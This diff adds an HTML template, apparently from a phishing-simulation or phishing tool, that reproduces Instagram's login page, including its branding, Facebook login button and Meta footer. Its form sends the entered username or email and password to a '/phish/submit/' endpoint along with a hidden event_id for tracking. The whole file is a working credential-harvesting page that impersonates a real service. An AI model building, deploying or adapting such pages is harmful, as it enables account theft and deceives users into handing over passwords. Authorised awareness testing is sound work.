@@ -1,0 +1,163 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Instagram</title>
+  <style>
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
+      background: #fafafa;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      min-height: 100vh;
+    }
+    .card {
+      background: #fff;
+      border: 1px solid #dbdbdb;
+      border-radius: 4px;
+      padding: 40px 40px 24px;
+      width: 350px;
+      text-align: center;
+      margin-bottom: 10px;
+    }
+    .logo {
+      font-size: 36px;
+      font-family: 'Billabong', cursive;
+      font-weight: 400;
+      color: #000;
+      margin-bottom: 24px;
+      font-style: italic;
+      letter-spacing: -1px;
+    }
+    .divider {
+      display: flex;
+      align-items: center;
+      gap: 16px;
+      margin: 16px 0;
+      color: #8e8e8e;
+      font-size: 13px;
+      font-weight: 600;
+    }
+    .divider::before, .divider::after {
+      content: '';
+      flex: 1;
+      height: 1px;
+      background: #dbdbdb;
+    }
+    .facebook-btn {
+      width: 100%;
+      padding: 10px;
+      background: transparent;
+      border: none;
+      color: #385185;
+      font-size: 14px;
+      font-weight: 600;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      margin-bottom: 16px;
+    }
+    input {
+      width: 100%;
+      padding: 9px 10px;
+      border: 1px solid #dbdbdb;
+      border-radius: 3px;
+      background: #fafafa;
+      font-size: 12px;
+      margin-bottom: 6px;
+      outline: none;
+    }
+    input:focus {
+      border-color: #a8a8a8;
+      background: #fff;
+    }
+    .login-btn {
+      width: 100%;
+      padding: 8px;
+      background: #0095f6;
+      color: #fff;
+      border: none;
+      border-radius: 8px;
+      font-size: 14px;
+      font-weight: 600;
+      cursor: pointer;
+      margin-top: 8px;
+      opacity: 0.7;
+    }
+    .login-btn:hover { opacity: 1; }
+    .forgot {
+      font-size: 12px;
+      color: #00376b;
+      text-decoration: none;
+      display: block;
+      margin-top: 16px;
+    }
+    .card2 {
+      background: #fff;
+      border: 1px solid #dbdbdb;
+      border-radius: 4px;
+      padding: 20px;
+      width: 350px;
+      text-align: center;
+      font-size: 14px;
+      color: #000;
+      margin-bottom: 16px;
+    }
+    .card2 a { color: #0095f6; font-weight: 600; text-decoration: none; }
+    .app-links { display: flex; gap: 8px; justify-content: center; margin-top: 16px; }
+    .app-links img { height: 40px; }
+    footer {
+      font-size: 12px;
+      color: #8e8e8e;
+      text-align: center;
+      margin-top: 24px;
+    }
+    footer a { color: #8e8e8e; text-decoration: none; margin: 0 4px; }
+  </style>
+</head>
+<body>
+
+  <div class="card">
+    <div class="logo">Instagram</div>
+
+    <button class="facebook-btn">
+      <svg width="20" height="20" viewBox="0 0 24 24" fill="#385185">
+        <path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/>
+      </svg>
+      Log in with Facebook
+    </button>
+
+    <div class="divider">OR</div>
+
+    <form method="POST" action="/phish/submit/">
+      {% csrf_token %}
+      <input type="hidden" name="event_id" value="{{ event_id }}">
+      <input type="text" name="email" placeholder="Phone number, username, or email" required>
+      <input type="password" name="password" placeholder="Password" required>
+      <button type="submit" class="login-btn">Log in</button>
+    </form>
+
+    <a href="#" class="forgot">Forgot password?</a>
+  </div>
+
+  <div class="card2">
+    Don't have an account? <a href="#">Sign up</a>
+  </div>
+
+  <footer>
+    <div style="margin-bottom:16px">
+      <a href="#">Meta</a><a href="#">About</a><a href="#">Blog</a>
+      <a href="#">Jobs</a><a href="#">Help</a><a href="#">Privacy</a>
+      <a href="#">Terms</a>
+    </div>
+    <div>© 2025 Instagram from Meta</div>
+  </footer>
+
+</body>
+</html>
